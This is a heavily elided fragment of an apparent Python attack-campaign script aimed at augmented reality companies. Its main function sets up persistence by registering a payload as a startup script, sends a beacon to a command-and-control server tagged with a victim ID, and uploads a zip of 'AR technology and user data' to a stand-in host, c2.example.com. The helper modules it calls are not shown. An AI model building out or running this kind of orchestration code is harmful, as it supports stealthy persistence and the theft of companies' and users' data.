...
def main():
    ...
    """
    print(f"[*] Starting augmented_reality_campaign campaign...")
    ...
    # 2. Persistence
    print("\n[*] Phase 2: Persistence")
    persistence.add_startup_script("payloads/AR_technology_and_user_data_exfiltrator.py")
    ...
    command_control.send_beacon(c2_server, "VICTIM-AUGMENTED_REALITY_COMPANIES-01")
    ...
    exfiltration.exfiltrate_data("AR_technology_and_user_data/AR_technology_and_user_data.zip", "https://c2.example.com/upload")
    run_tool("payloads/AR_technology_and_user_data_exfiltrator.py")
